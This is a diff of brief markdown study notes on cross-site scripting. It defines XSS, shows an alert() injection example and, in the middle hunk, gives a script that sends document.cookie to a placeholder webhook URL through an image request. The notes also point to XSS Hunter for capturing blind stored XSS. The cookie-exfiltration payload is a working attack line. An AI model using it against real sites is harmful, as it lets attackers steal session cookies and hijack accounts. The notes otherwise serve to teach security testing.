@@ -1,7 +1,7 @@
 **Cross-site Scripting (XSS) :**
 
 * It is type of Injection.
-* commonly found in web application.
+* commonly found in web application / browser.
 * occurs due to an input validation failure where attacker inject malicious code.
 * It makes it possible for attacker to inject malicious code (eg. JavaScript programs) into victim's web browser by executing that malicious code in server, so whenever victim visit then it will steal users information like session cookies.
 
@@ -66,19 +66,15 @@ eg. <input .... value="abc"><script>alert('1')</script>
 3\. In input field add following script:
 
 <script>
-
 var img = document.createElement("img");
-
-img.src="WEBHOOK\\\_URL"+"/cookie="+encodeURIComponent(document.cookie);
-
+img.src="WEBHOOK\\\\\\\_URL"+"/cookie="+encodeURIComponent(document.cookie);
 document.body.appendChild(img);
+</script>
 
 
-
-
-***Blind Store XSS:***
+\*\*\*Blind Store XSS:\*\*\*
 
 XSS hunter 			....website is used to get and active all the time to monitor and capture xss data.
+website: \*https://xsshunter.trufflesecurity.com/app/#/\*
 
-website: *https://xsshunter.trufflesecurity.com/app/#/*
 
